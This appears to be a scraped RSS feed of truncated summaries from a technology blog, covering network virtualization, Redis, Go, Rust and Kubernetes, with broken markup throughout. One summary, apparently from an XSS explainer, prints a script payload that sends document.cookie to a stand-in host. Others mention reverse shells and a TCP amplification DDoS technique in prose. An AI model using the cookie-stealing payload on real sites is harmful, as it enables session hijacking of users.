Let&amp;rsquo;s review the concept of a broadcast domain here.
The Broadcast Domain is the range to which a broadcast frame (with a destination MAC address of all 1s) can pass, i.</description>

      <description>Macvlan allows you to configure multiple virtual network interfaces on a single network interface of the host, these network interfaces have their own independent MAC addresses, or can be configured with IP addresses for communication. virtual machines or container networks under Macvlan are in the same network segment as the host and share the same broadcast domain. macvlan is more similar to Bridge, but because it eliminates the Bridge, it is simpler and more efficient to configure and debug.</description>

      <description>VXLAN is Virtual eXtensible Local Area Network, a virtual extensible local area network. It is an overlay technology that builds a virtual layer 2 network over a layer 3 network. rfc7348 (Ref. 1) describes it as follows.
 A framework for overlaying virtualized layer 2 networks over lay 3 networks.
 Every technology that comes out has a problem to solve, and VXLAN is no exception, so let&amp;rsquo;s take a look at what problems VXLAN is trying to solve.</description>

      <guid>https://www.sobyte.net/post/2022-05/network-virtualization-ipvlan/</guid>
      <description>IPVLANs are similar to MACVLANs in that they both virtualize multiple virtual network interfaces from a single host interface. An important difference is that all virtual interfaces have the same mac address and different ip addresses.
Because all virtual interfaces share a mac address, there are some things to keep in mind.
 The DHCP protocol generally uses the mac address as the machine identifier when assigning an ip. In this case, the client needs to configure a unique ClientID field when dynamically acquiring the ip, and the DHCP server should be properly configured to use this field as the machine identifier instead of using the mac address   Ipvlan is a relatively new feature of the linux kernel.</description>

      <description>In the previous note, we learned about a typical principle of VPN through TUN/TAP devices when introducing network devices, but did not practice how TUN/TAP virtual network devices specifically function practically in linux. In this note we will look at how a very typical IPIP tunnel in the cloud computing field is implemented through TUN devices.
IPIP Tunneling As we mentioned in the previous note, the TUN network device can encapsulate a Layer 3 (IP) network packet within another Layer 3 network packet, and it looks like the packet sent out through the TUN device will look like this.</description>

      <description>Network Virtualization is the process of building a virtual network with a different topology than the physical network. For example, if a company has multiple offices around the world, but wants its internal network to be one, it needs network virtualization technology.
Starting with NAT Suppose one machine in the Beijing office has an IP of 10.0.0.1 (which is an intranet IP and cannot be used on the Internet) and one machine in the Shanghai office has an IP of 10.</description>

      <description>You have heard that the Rust language has Safe as one of its features, but due to the sad fact that hardware is Unsafe, all &amp;ldquo;safe&amp;rdquo; must be encapsulated in &amp;ldquo;Insecure&amp;rdquo; must be encapsulated on top of &amp;ldquo;Insecure&amp;rdquo;. This leads to the fact that &amp;ldquo;Safe&amp;rdquo; in the full sense of the word is very difficult to achieve and extremely limited in functionality.
So let&amp;rsquo;s see where Rust&amp;rsquo;s Safe boundary lies.</description>

      <description>Today, I encountered an unexpected situation when copying a folder using COPY while writing a dockerfile. I&amp;rsquo;ll document the correct way to use it here.
Background Notes Today, when I copied the folder to the image via dockerfile, I found that the contents of the folder were copied in.
The dockerfile looks like this.
1 2 3 4 5  FROMnode:alpineWORKDIR/usr/src/appCOPY dist node_modules package.json ./EXPOSE3000CMD [&amp;#34;yarn&amp;#34;, &amp;#34;start:prod&amp;#34;]  I wanted to copy both dist and node_modules folders into the mirror, but I didn&amp;rsquo;t want to use multiple COPYs to copy them separately, which would result in an extra layer, and found that dist and node_modules folders themselves were not copied into the mirror, but the contents of the folders were copied into the mirror separately.</description>

      <description>1 Preface Caching can be a powerful tool for high-performance systems, and it can be found in many systems. When cache resources are tight, we always expect cache entries that will be used in the future to remain in the cache, and eliminate cache entries that will not be used in the future. According to the locality principle of caching, the more recently accessed cache entries are more likely to be used again in the future, and the most recently accessed cache entries are more likely to be used again in the future.</description>

      <description>0. Preface For databases where the storage medium is disk or SSD, the mainstream has long used B+ trees as an index structure to achieve fast data lookup. When the data volume is not too large, B+ tree read and write performance is very good. But in the case of massive data, the B+ tree is getting taller and taller, and because the B+ tree needs to split and merge pages along the B+ tree layer by layer when updating and deleting data, it seriously affects data writing performance.</description>

      <description>Kubernetes Multi-tenant Model Along with the development and promotion of cloud-native technologies, Kubernetes has become the operating system of the cloud computing era. In the mainframe era, the operating system had the need for multiple tenants sharing the same physical machine resources; in the cloud computing era, the need for multiple tenants sharing the same Kubernetes cluster has emerged. In this regard, the community&amp;rsquo;s Kubernetes Multi-tenancy Working Group has defined three models of multi-tenancy for Kubernetes.</description>

      <description>1. Introduction A new TCP reflection amplification attack technique launched using middleboxes was proposed by Kevin Bock et al. at the University of Maryland USENIX conference in August 2021: an attacker can exploit a vulnerability in TCP session identification in some network middleboxes to achieve a new DDoS reflection amplification attack. Unlike the TCP reflection launched using protocol stacks that could not amplify attack traffic that appeared in 2018, this new attack achieves the effect of TCP protocol-based traffic amplification, which makes the attack technique spread rapidly in the black market and proliferate across the network after its birth.</description>

      <description>Since Go 1.12, people have been having problems with monitoring false positives. The reason for this is that Go changed the memory reclamation policy used by the madvise system call from MADV_DONTNEED to MADV_FREE starting in 1.12. From the available documentation, it appears that RSS, the most commonly used memory monitoring metric, does not reflect the portion of memory in the process that is not reclaimed by the OS. Naturally, there are some suggestions that RSS should be replaced with a more appropriate metric, such as PSS or even USS.</description>

So what is Reverse Shell? What exactly does it do? The console listens to a TCP/UDP port first, then the controlled side makes a request to this port and transfers its command line input and output to the console, so that the console can enter commands to control the controlled side.</description>

In fact, Kubernetes offers a wide range of options that can greatly improve the security of your application, and if you use them well, you can keep most attacks at bay. To make it easier to get started, I&amp;rsquo;ve summarized them into a few best practice configurations that you can use once you&amp;rsquo;ve read them.</description>

1  &amp;lt;p&amp;gt;&amp;lt;script&amp;gt;location.href=&amp;#34;//domain.com/?c=&amp;#34; + document.cookie&amp;lt;/script&amp;gt;&amp;lt;/p&amp;gt;   Another user viewing a page with this content will be redirected to domain.</description>

      <description>What exactly is MVCC? Definition: Multi-Version Concurrency Control , literally, the use of multiple versions for reasonable control during concurrency (that&amp;rsquo;s how I took it literally anyway), obviously this thing is an abstract concept, and it is. It is mainly found in some data management software. Maintaining multiple versions of a data makes the read and write operations conflict-free. Why is this thing there?

      <description>AOF and RDB persistence process review From the previous two articles we know some details of AOF and RDB persistence. In this article, let&amp;rsquo;s compare and contrast what persistence method is better for what environment? First we review the process of the two persistence methods.
AOF Persistence Process AOF persistence is similar to Mysql&amp;rsquo;s binlog log, which records all modified operations, and all commands sent by the client are appended and saved in Redis command protocol format, to ensure proper file size, Redis also rewrites the AOF file in the background by sub-process creation, so that the AOF file size does not exceed the actual capitalization required to save the dataset state, and Note that Redis gives preference to AOF files to restore data when the server is started by executing these commands, because AOF text saves a more complete dataset than RDB does, and the stored files are generally larger than RDB files.</description>

      <description>Redis provides two separate persistence mechanisms, RDB and AOF. This chapter first describes how the AOF feature works, how commands are stored in AOF files, and how different AOF storage modes affect data security and Redis performance. After that, we will introduce the method of restoring the database state from the AOF file and the implementation mechanism behind the method. Some pseudo-code will also be used to facilitate understanding. This</description>

      <description>This technique is used for IO operations, which consume a lot of CPU performance. Why IO operations can easily become a performance bottleneck? Every IO operation involves a conversion between the kernel space and user space of the operating system, and the real IO operations are actually performed in the kernel space of the operating system. Whether it is file IO, or network IO, in the end it can be unified as an exchange of user-space and kernel-space data.</description>

      <description>The core function of an operating system is software governance, and a very important part of software governance is to allow multiple software to work together to use the computer&amp;rsquo;s resources rationally and without contention.
Memory, as the most basic hardware resource of a computer, has a very special position. We know that the CPU can directly access very few storage resources, only: registers, memory (RAM), ROM on the motherboard.</description>

      <description>Computer memory is divided in bytes, so in theory the CPU can access any number of bytes, but in practice this is not the case. For a CPU with a data bus width of 32 bits, the actual addressing step is 4 bytes, which means that only memory numbered in multiples of 4 is addressed, such as 0, 4, 8, 12, 1000, and so on, but not memory numbered 1,</description>

GitHub Action is a CI\CD service that GitHub launched in 2018. The bill shows that Matt used the Actions service for about 16 billion minutes in a month, which translates to over 30,000 years. That&amp;rsquo;s about 30,000 years back to the Paleolithic era, so $127 million doesn&amp;rsquo;t seem like too much to charge.</description>

      <description>Last month, Microsoft announced its support for a proposal for &amp;ldquo;further development of JavaScript and TypeScript&amp;rdquo;, and although this is a so-called Phase 0 proposal, Microsoft has announced that it hopes to submit the proposal to TC39 (Technical Committee 39) on time. Some developers in the industry say that if this proposal is adopted and implemented, it will be a big change for JavaScript and TypeScript.
20 Years of JavaScript Looking back over the last 20 years, if we compare web development now and then, we see that while JavaScript as a programming language has evolved a lot, the ecosystem around JavaScript has progressed and evolved a lot.</description>

      <description>Python has a lot of magic methods, and this article documents the usefulness of two magic methods used by context managers that can be customized with statements, namely the __enter__ and __exit__ methods.
Custom Context Management Classes The most common with statement is the open function. Instead of explaining it here, let&amp;rsquo;s look directly at an example of a custom class.

Compared with Quagga/FRRouting, GoBGP has better performance and shorter convergence time, and can be applied to larger networks, such as acting as an IXP router. GoBGP can be configured via the gRPC API using multiple languages such as Python, C++, and of course the CLI. GoBGP</description>

A background process, as you can imagine, executes in the background, without a terminal, without a login shell, and processes when certain Events occur, or periodically performs a task. Usually, daemon processes end in d, but it is not required. For example, the daemon processes for Redis and Nginx do not end in d.</description>

      <description>crate Let&amp;rsquo;s start with the official definition. A crate is a binary or library. The crate root is a source file that the Rust compiler starts from and makes up the root module of your crate (we&amp;rsquo;ll explain modules in depth in the &amp;ldquo;Defining Modules to Control Scope and Privacy&amp;rdquo; section). A package is one or more crates that provide a set of functionality. A package contains a Cargo.toml file</description>

      <description>Introduction In Increasing the Effectiveness of Directory Caches by Deactivating Coherence for Private Memory Blocks, the authors describe a dynamic predictive approach to diverting memory regions that are only used by one processor Cache performance can be improved by discarding the coherence protocol.
Using directory-based consistency protocols in most shared-memory multicore processors would not result in insufficient bus bandwidth, but recording all memory blocks in main memory would require the use of a large amount of storage requirements.</description>

      <description>1. What are the advantages or features of Go compared to other languages? Go allows cross-platform compilation, compiling a binary executable that can be deployed directly on the corresponding system and run. Go inherently supports high concurrency at the language level, through goroutine and channel. channel is based on the CSP concurrency model, which is called ``sharing memory through communication&amp;rsquo;&amp;rsquo;; Go implements its own scheduling mechanism in the runtime: GMP,</description>

      <description>Background When maintaining a k8s cluster, a very common requirement is to persist the logs, on the one hand to facilitate future traceability, and on the other hand to aggregate the logs of the replicate out of the same service.
In my current needs, I only need to persist the logs and do not need to do additional analysis. So I did not deploy a service like ElasticSearch to index the logs.</description>

      <description>Write-invalidate and Write-update There are two basic cache coherence ideas.
 write-invalidate: when writing data, set this Cache Line in other Cache to Invalid write-update: when writing data, write the new result to other Cache that has this Cache Line  Write-once protocol The write-once protocol defines four states.
 Invalid: indicates that the block is not legal Valid: indicates that the block is legal and may be shared, and that the data has not been modified Reserved: indicates that the block is legal, not shared, and that the data has not been changed Dirty: means the block is legal, not shared, and the data has been modified, which is different from the memory.</description>

      <description>io_uring is an asynchronous I/O interface provided by Linux. io_uring was added to the Linux kernel in 2019, and after two years of development, it has now become very powerful. This article introduces the io_uring interface based on Linux 5.12.10. The implementation of io_uring is mainly in fs/io_uring.c. User State API for io_uring The implementation of io_uring uses only three syscalls: io_uring_setup , io_uring_enter and io_uring_register. They are used to</description>

This article is a comprehensive and in-depth explanation of the source code implementation of the Redis data structure, so I hope you can learn something from it. The source code for Redis strings is placed in two files, sds.c and sds.h. The implementation has been stripped out into a separate</description>

      <description>SRV record is an abbreviation for Server Resource Record, a record of service resources provided by a server supported in the DNS server&amp;rsquo;s database, whose main purpose is to indicate what services a server is capable of providing.
Simply put, an SRV record is a simple piece of information about which computer provides which service.
SRV records are the new face of DNS records, and were only defined in RFC 2052, so many older versions of DNS servers do not support SRV records.</description>

      <description>As the Rust language continues to evolve, it&amp;rsquo;s natural to need plans for where the language will go next. So the Rust language design team (Rust Lang Team) recently published a roadmap for updates to the Rust language in 2024 on the official blog, providing A look at the future of Rust. It is important to note that it is still early in 2024, so the Rust roadmap may change over time on this basis.</description>

      <description>CUE is an open source data constraint language designed to handle configurations, structures, data and execute them. Most people start using CUE because they want to do data validation and generate configurations. Then they go on to use CUE for data templates, runtime input validation, code generation, scripting, pipline, and more. First you need to understand that CUE is not a programming language in the usual sense, it is a Turing non-complete programming language.</description>

      <description>This blog post should have been published last year when I finished reversing the DeepL client, but I delayed starting it because I was afraid that once the relevant details were made public, they would be widely adopted by others and blocked by the DeepL official. Some time ago I released DeepL Docker image of Free Api, and also made the binary public on GitHub. I believe DeepL will be in action soon, so I think it&amp;rsquo;s time to make the details public.</description>

This article explains a special socket that does not require a traditional IP address and port, but uses the file system for data interaction between programs, and can only be used on unix systems.</description>

All builds are &amp;ldquo;locked&amp;rdquo; External changes (such as releasing a new version of a dependency) do not affect Go builds.
Unlike the configuration files used by most other package managers, Go modules do not have a separate list of constraints and lock files for locking specific versions.</description>

      <description>We will often use the Align component in our development to position the child components. Usually we use several common relative positions, such as alignment: Alignment.bottomRight, bottom-right corner. Recently, the official documentation about alignment: Alignment(x, y) in Align seems to be a little bit wrong, and then combined with the relevant source code, we finally figured it out. Then I found that most of the tutorials on the Internet are wrong, so I&amp;rsquo;ll share my understanding of Align&amp;rsquo;s alignment principle below.</description>

I sometimes wonder what users of Kubernetes should care about and what they should not care about. For a newbie, the first thing you should do when starting out is to figure out the basic workflow. Of course, if you look directly at the Kubernetes documentation, there are a lot of dazzling concepts that can be confusing and confusing.</description>

      <description>Applications within a cluster sometimes need to invoke external services, and we know that internal service invocations within the cluster are accessed through Service, so is it possible to keep using Service uniformly for external services as well? The answer is yes, accessing external services through Service can bring other benefits besides the unified way. For example, if the same application in different environments (spaces) accesses the external database in different environments, the configuration of both sides can be unified through Service mapping, so that different applications in different spaces can access different external databases through the same Service Name.</description>

That is, instead of using pip install, use python -m pip install to install the package. Both beginners and experienced developers encounter this problem. It can be confusing when you install a package using pip, but when you call it, it says you can&amp;rsquo;t import it: for newcomers you&amp;rsquo;ve probably read some old tutorials, for veteran developers you&amp;rsquo;re probably still used to the old way of using it.</description>

      <description>When a function is defined in Python, the variable space is divided into global and local variables.

This allows for autonomous implementation of better memory usage patterns, such as memory pooling, pre-allocation, etc. This way, you don&amp;rsquo;t need to make a system call for every memory allocation. The Golang runtime memory allocation algorithm is derived from Google&amp;rsquo;s TCMalloc algorithm for C. The core idea</description>

      <description>Golang&amp;rsquo;s garbage collection mechanism allows automatic memory management to make our code cleaner and less likely to leak memory. However, the GC periodically stops and collects unused objects, so it still adds overhead to the program. The Go compiler is smart enough to decide, for example, whether a variable needs to be allocated on the heap or the stack, and unlike an allocation on the heap, a variable on the stack is reclaimed at the end of the function that declared it.</description>

      <description>String concatenation is indispensable in everyday coding, and the most commonly used is the native concatenation method (+=). However, its performance is fine for a small number of splices, but for a large number of string splices, other more efficient methods should be used.
This article first lists several string concatenation methods commonly used in Golang, and then benchmarks them, so that after reading this article, we can have a basic understanding of the applicability of various concatenation methods.</description>

      <description>Since @babel/polyfill is no longer recommended after Babel 7.4, both @babel/preset-env and plugin-transform-runtime can set corejs to handle polyfill. The main reasons for the deprecation of @babel/polyfill are. This package simply introduces stable core-js and regenerator-runtime/runtime, where the latter can be replaced using the plugin @babel/plugin-transform-regenerator. This package does not smoothly transition from core-js@2 to core-js@3. Introduction to Babel In short, Babel is a compiler that converts code written in</description>

      <description>Package management is a feature that Go has been criticized for doing poorly. Before 1.11, go get lacked support for package versioning and reproducible builds. At the time, many useful tools were born in the Go community, such as glide, dep, etc. After 1.11, Go introduced the Go Module, and there was no longer a GOPATH restriction, so you could write projects in any path you wanted, but support for private repositories was not very good at that time.</description>

      <description>PostgreSQL&amp;rsquo;s tablespaces allow defining where database objects are stored in the file system. In effect, a directory is specified for the storage of data files for database objects such as tables, sequences and indexes.
PostgreSQL uses the operating system&amp;rsquo;s filesystem for storage. This is a bit different from Oracle, which implements its own &amp;ldquo;file system&amp;rdquo;.
In PostgreSQL, one tablespace can be used by multiple databases; and one database can use multiple tablespaces, in a &amp;ldquo;many-to-many&amp;rdquo; relationship.</description>

      <description>When we develop HTTP Server, we often have the need to cache the interface content. For example, for some hot content, we want to cache it within 1 minute. Caching the same content in the short term will not have a material impact on the business and will also reduce the overall load on the system.
Sometimes we need to put the caching logic inside the Server, rather than on the gateway side such as Nginx, because we can easily clear the cache as needed, or we can use other storage media such as Redis as the caching backend.</description>

      <description>The reflection package provided by Go in the standard library gives Go programs the ability to reflect at runtime (reflection), but this reflection ability is also a &amp;ldquo;double-edged sword&amp;rdquo;, it has the advantage of solving a specific class of problems, but also brings a lack of logic, performance problems, and difficult to find problems and debug It also brings disadvantages such as unclear logic, performance problems, and difficulty in problem</description>

      <description>In the era of cloud-native and microservices-dominated architectural models, there are only two types of communication protocols used for internal service interactions: HTTP API (RESTful API) and RPC. With today&amp;rsquo;s hardware configurations and network conditions, modern RPC implementations generally perform better than HTTP API. We compare json over http with gRPC(insecure), using ghz and hey stress test the gRPC and json over http implementations. The performance of gRPC (Requests/sec: 59924.34)</description>

But expvar only provides the lowest level of metric definition support, for some complex metric scenarios, third-party or self-implemented metrics packages are essential.
The go-metrics package is the most used metrics package in the Go domain, and it is an incomplete Go port of Coda Hale&amp;rsquo;s Metrics library, which is still very active in the Java community (I have to sigh: the Java ecosystem is really powerful).</description>

      <description>In the article &amp;ldquo;Go Classical Blocking TCP Stream Parsing in Practice&amp;rdquo;, we implemented a custom TCP stream-based parsing protocol based on Go&amp;rsquo;s classical blocking I/O model. The advantage of this one-connection-per-goroutine model is that it is simple, well-written, and well-understood, reducing the mental burden on developers. However, once the number of connections is up, the number of goroutines increases linearly. When faced with a large number of connections, this model</description>

      <description>1. Go function closures The Go language provides native support for closures. In Go, closures are function literals. The Go specification interprets closures in the following way.
 function literals are closures: they can refer to variables defined in their wrapping function. These variables are then shared between the wrapping function and the function literals, and they continue to exist as long as they can be accessed.
 Closures have a wide range of applications in Go, most often used in conjunction with the go keyword to create a new goroutine, such as the following code from the net/http package in the standard library.</description>

We only need to configure a public GOPROXY service for the environment variable GOPROXY within our company/organization to easily pull all public go modules (public mods are open source mods).
However, as the number of Go users in the company increases and the number of Go projects increases, the problem of &amp;ldquo;code duplication&amp;rdquo; arises.</description>

It is very easy to add a simple delay, just one command like this: $ tc qdisc add dev eth0 root netem delay 1s, you don&amp;rsquo;t even need to fully understand the meaning of the parameters in the command . But when you want to do some more specific restrictions, (such as adding delay only to a specific ip port, or adding delay only to inbound traffic), things get a little tricky, and a simple Google search doesn&amp;rsquo;t seem to satisfy the requirements anymore.</description>

      <description>Previously, I wrote an article on SSL protocol, which introduces the fundamentals of cryptography and gives an overall overview of the SSL protocol. For space reasons, the detailed flow of the SSL handshake was not covered in depth. In this paper, we will disassemble the handshake process and introduce it in detail at the message level. If you don&amp;rsquo;t have the basic concepts of cryptography or don&amp;rsquo;t know the basic information of SSL protocol, it is recommended to read the previous article first.</description>

      <description>Vulnerability Description The vulnerability is in the BN_mod_sqrt() interface function, which is used to compute the square root of a modulus and expects that the argument p should be a prime number, but there is no check within the function, which leads to a possible infinite loop internally. This function is used when parsing certificates of the following format.
 when the certificate contains an elliptic curve public key in compressed format certificate with explicit elliptic curve parameters whose base point is encoded in compressed format  In short, this function is called when the certificate is parsed and the point coordinates need to be decompressed.</description>

      <description>I first learned about the slab algorithm when I was learning the Linux kernel. The kernel uses the Buddy System algorithm to manage memory pages. But for small objects, it would be wasteful to use a page allocator, so slab was born. The kernel&amp;rsquo;s kmalloc() is managed using slab. nginx&amp;rsquo;s shared memory management uses the same idea, but it is not as complex as slab in the Linux kernel. slab</description>

      <description>sync.Pool is Golang&amp;rsquo;s built-in object pooling technology, which can be used to cache temporary objects to avoid the consumption and pressure on GC caused by frequent creation of temporary objects. You can see sync.Pool used extensively in many well-known open source libraries. For example, the HTTP framework Gin uses sync.Pool to reuse the gin.Context object that is created with each request. sync.Pool can also be found in grpc-Go, kubernates, and</description>

People usually use the official grpc library to communicate directly. But as far as I can see, most of them are Unary requests and very few are stream calls. Unary requests of gRPC are not much different from ordinary http/2 calls, so we can write a simple gRPC client by ourselves. Today,</description>

      <description>Anyone familiar with the Go language should be familiar with interfaces and methods such as io.Copy()/io.CopyN()/io.CopyBuffer()/io.ReaderFrom. They are APIs that are often used to transfer data using Go to manipulate various types of I/O. The TCP-based socket makes use of Linux&amp;rsquo;s zero-copy technologies sendfile and splice when transferring data using these interfaces and methods.
splice After looking through Linux zero-copy techniques, splice is more suitable as a general-purpose zero-copy method than other techniques such as mmap, sendfile and MSG_ZEROCOPY in terms of cost, performance and applicability.</description>

 The advantage of separating IaaS, MySQL middleware, and App tier monitoring is that the systems are highly available and fault-tolerant to each other. When the App tier monitoring does not work, the IaaS tier monitoring will immediately show up. Separation of long and short term metrics. Short-term metrics are used to provide alerting systems with high frequency queries for recent data, and long-term metrics are used to provide people with queries for data sets that span a larger period of time.</description>

      <description>Kubernetes has claimed to support 5,000 nodes in a single cluster since an earlier release, and there are no plans to increase the number of nodes supported by a single Kubernetes cluster in the near future. If you need to support more than 5,000 nodes in Kubernetes, Federation is the preferred method of cluster federation.
 People frequently ask how far we are going to go in improving Kubernetes scalability. Currently we do not have plans to increase scalability beyond 5000-node clusters (within our SLOs) in the next few releases.</description>

At the same time, the development task mainly uses Yaml and Shell, which extends the scope of Tekton for various scenarios. Above is a diagram of Tekton under multiple clusters. Why does Tekton need a multi-cluster execution pipeline? Variable Kubernetes clusters at any time. A single Kubernetes cluster cannot</description>

Generally we use macros to determine the code, selectively pick the parts that need to be compiled, and turn on such conditions in the build system. 1 2 3 4</description>

      <description>In non-phased build scenarios, when using containers for builds, we can mount the cache directory in the container to the build host to perform the build task; then copy the product to the run image to make the application image. However, in a phased build, the build image and the run image are in the same Dockerfile, which makes it difficult to optimize the cache for third-party dependencies.

      <description>This article introduces the idea of implementing Flink&amp;rsquo;s JobManager HA on top of Kubernetes. flink 1.12 is not yet released, but we have seen this piece in the development plan. But this post is mainly about our internal implementation. 0. Flink HA HA stands for HighAvailability and is used in many distributed systems to solve the SPOF (single point of failure) problem.

      <description>docker has been criticized in the Kubernetes community for being a CRI, but it&amp;rsquo;s important to understand that CRIs are only part of docker&amp;rsquo;s functionality. There are still many areas that rely heavily on docker for local development testing or CI/CD streamline image builds. For example, docker&amp;rsquo;s official build-push-action is the preferred method for building container images on GitHub. Even docker&amp;rsquo;s rivals podman + skopeo + buildah are using docker</description>

      <description>Today&amp;rsquo;s network applications have shifted from CPU-intensive to I/O-intensive, and most of the network servers are based on the C-S model, i.e., the Client-Server model, which requires a lot of network communication between the client and the server, which also determines the performance bottleneck of modern network applications: I/O. The standard I/O interface of the traditional Linux operating system is based on data copy operations, i.e. I/O operations result in</description>

The meaning of each letter is as follows.
 Consistency Availability Partition tolerance  Here we use some simple examples to illustrate.
Suppose our system is composed of two services:G1 and G2.
G1 and G2 maintain the same record V0. G1 and G2 can communicate with each other, and an external client (Client) can invoke either service.</description>

      <description>Today&amp;rsquo;s smartphones are carrying more and more features, and naturally users need more and more storage space. But for users with low-end phones, storage space is stretched to the limit, and they often need to uninstall apps that are already installed on their phones in order to install some new apps, thus freeing up space on their phones.
Google brought the feature of uninstalling unused apps to Android a few years ago, which prompts users to uninstall apps they haven&amp;rsquo;t used in a long time to free up space when the phone is running low.</description>

CRD Controller For the CRD (CustomResourceDefinition) itself, it is not too much to understand it as just a Schema of OpenApi, because that is its only ability and role, but for the broader statement: &amp;ldquo;CRD is used to implement xx functions&amp;rdquo;, it is actually the CRD Controller that is responsible for implementing the functions.</description>

      <description>The database used by Open Hackathon is MongoDB, and in containerization, the security of data is a top priority.
Storage issues Stateful applications need to use PersistentVolume when deployed on Kubernetes, but if the underlying PV storage is unreliable, even with PV, data security is still not guaranteed.
In a general usage scenario, the application needs to define a PersistentVolumeClaim to describe the required storage resources and use the PersistentVolumeClaim in the Pod, and the cluster will create or find a PersistentVolumeClaim based on the description in the PersistentVolumeClaim.</description>

      <description>With the release of Kubernetes 1.14, it was discovered that the Yaml management tool kustomize, which was only for the Kube interest group, was integrated into kubectl, so that you can use kubectl apply -k to apply kustomization.yaml from the specified directory to the cluster.
What is kustomize Using the tool definitely starts with figuring out where the tool is located. kustomize (Github link) is described in the code repository as.</description>

In the face of such a hot technology, we have some questions: What exactly is Service Mesh and what does it solve? In this article, we try to briefly explain the architectural design of Service Mesh and introduce its popular solution, Istio.
Starting with distributed systems Modern applications rarely use monolithic architectures anymore, and when distributed architectures become mainstream, network calls between system components become a natural problem.</description>

      <description>When participating in interviews, Linux processes should be considered a must for me, because many languages don&amp;rsquo;t bother to implement a set of process management and scheduling, but instead borrow directly from the operating system, especially the Python community which sees no need to duplicate the wheel in this area and uses a simple wrapper around system calls. As a result, it&amp;rsquo;s hard to really know what&amp;rsquo;s going to happen to the concurrent code you write if you don&amp;rsquo;t know much about Linux processes.</description>

      <description>This article will explain the basic operations of concurrent programming in Python. Concurrency and parallelism are twin brothers, and the concepts are often confused. Joe Armstrong, the father of Erlang, has a very interesting diagram that illustrates these two concepts. One of my personal preferences is that concurrency is macro-parallel and micro-serial. GIL While Python comes with great class libraries to support multithreaded/processed programming, it is well known that Python</description>

      <description>A container acts as an instance of a image, a runtime for stateless applications in the images. Stateless is so-called because the lifecycle of a container is very flexible. When a container&amp;rsquo;s lifecycle ends, the data generated during that time does not persist, but is removed with the deletion of the container. However, most applications are for data now, so the persistence of containers is explored here.
Storage for containers Before we discuss container persistence, let&amp;rsquo;s explore what data storage looks like without persistence, i.</description>

      <description>Apache Spark is one of the most widely used computational tools for big data analytics today. It excels at batch and real-time stream processing and supports machine learning, artificial intelligence, natural language processing, and data analytics applications. The narrowly defined Hadoop (MR) technology stack is shrinking as Spark becomes more popular and more heavily used. In addition, general opinion and practical experience has proven that Hadoop (YARN) does not have the flexibility to integrate with a broader enterprise technology stack, except for Big Data-related workloads.</description>

      <description>The common data collections in JavaScript are lists (Array) and mapping tables (Plain Object). This article talks about mapping tables. Due to the dynamic nature of JavaScript, the object itself is a mapping table, and the &amp;ldquo;attribute name ⇒ attribute value&amp;rdquo; of an object is the &amp;ldquo;key ⇒ value&amp;rdquo; in the mapping table. To make it easier to use the object as a mapping table, JavaScript even allows property names</description>

      <description>A coroutine, also known as a micro-thread, is a lightweight thread. coroutines can be understood as processes that collaborate with the caller to produce values provided by the caller. The advantage over threads is that context switching is cheaper and under the control of the user.
History of development Coroutines in Python have gone through three main phases. coroutines were first implemented in Python 2.5, morphed from generators and implemented with keywords like yield/send; yield from was introduced, allowing complex generators to be refactored into small nested generators; Python 3.</description>

Job A Job is actually one or more pods that are defined to execute a task, and when the pod exits after execution, the Job is done. So Job is also called Batch Job, i.e. compute business or offline business.

      <description>Most of the authentication mechanisms in K8s are done with ServiceAccount. Although K8s has the concept of User, there is no resource that corresponds to a &amp;ldquo;person&amp;rdquo;, so it is still very difficult to do user management in K8s. The good thing is that K8s provides an alternative way for user management, which is to interface with the OIDC protocol. In this article, we&amp;rsquo;ll take a look at what the OIDC protocol is and how it is used in K8s.</description>

      <description>As we all know, in the K8s permission management system, you can bind RoleBinding to ServiceAccount, User and Group to achieve permission assignment.
We often use ServiceAccount to restrict the permissions of a pod; for User and Group, there are no specific resources to correspond to them except for some special system groups, which is very unfriendly to the user management in traditional projects.

      <description>The program itself doesn&amp;rsquo;t need to care where its data and code live, and memory appears to be contiguous and exclusive to the program. This is certainly not the case, and it is the operating system that is responsible for this - memory virtualization. This article describes how the operating system implements a virtual memory system.
Address Space The operating system provides an easy-to-use abstraction of physical memory: the address space.</description>

      <description>The previous article, Kubelet Pod Creation Workflow, explained how kubelet creates pods and how the components collaborate with each other. Based on the previous article, this article will explain how kubelet performs quality of service management for pods.
Pod QoS Kubernetes has a QoS type for each Pod, which is used to manage the quality of service for the Pod. There are three types, in decreasing order of priority.
 Guaranteed: Each container in a Pod must have a request and a limit, and the values must be the same.</description>

      <description>This article is based on reading the source code of Kubernetes v1.19.0-rc.3
 Kubelet, one of the four components of Kubernetes, maintains the entire lifecycle of a pod and is the last link in the pod creation process of Kubernetes. This article will introduce how Kubelet creates pods.
Architecture of Kubelet First look at a diagram of the Kubelet&amp;rsquo;s component architecture, as follows.
It can be seen that Kubelet is mainly divided into three layers: API layer, syncLoop layer, CRI and the following; API layer is well understood, that is, the part that provides the interface to the outside; syncLoop layer is the core working layer of Kubelet, the main work of Kubelet is centered around this syncLoop, that is, the control loop, run by producers and consumers; CRI provides the interface of container and mirror services, the container can be accessed as a CRI plugin when running.</description>

      <description>There are various network solutions for containers, and it is obviously impractical to adapt every network implementation supported, and CNI was invented to be compatible with multiple network solutions.CNI stands for Container Network Interface, which is a standard common interface to connect container management system and network plugins. In simple terms, container runtime provides network namespace for containers, network plug-in is responsible for inserting network interface into the network namespace</description>

      <description>There are more and more networking solutions for containers, and with each new solution, it is obviously unreasonable to adapt the networking solution to different container runtimes, and CNI is designed to solve this problem.
While maintaining a &amp;ldquo;home-level Kubernetes cluster&amp;rdquo; at home during holidays, I got the idea to write a network plugin, and developed Village Net based on cni/plugin.
Taking this network plugin as an example, this article focuses on how to implement a CNI plugin.</description>

I will introduce CSI through two articles, the first of which will focus on the basic components and workings of CSI, based on Kubernetes as the COs (Container Orchestration Systems) for CSI.</description>

      <description>There are three principles of Rust Ownership to keep in mind.
 For each value, there is an owner. There can only be one owner for a value at a time. When the owner leaves the scope, the corresponding value is automatically dropped.  hello is a string allocated on the heap, and the owner is s, which, when passed as an argument to the function takes_ownership, moves ownership to some_string .</description>

      <description>The core concept of Rust is Ownership, a GC-enabled language that allows the runtime to sweep the heap at runtime and release unreferenced garbage objects, such as go. For languages like c/c++, you need to manage the allocation and release of memory yourself. Rust uses the concept of Ownership and appends various check rules to the compiler to implement memory management. Note that most of Rust&amp;rsquo;s work is done at</description>

      <description>What is systemtap We generally debug our programs, and the logs printed by the business process are basically sufficient for our needs. If not, using strace, lsof, or perf is enough to see the bottleneck of performance. But for system programming, you can&amp;rsquo;t print logs like crazy, and many call stacks are in kernel space, so ordinary debugging means are stretched to the limit.
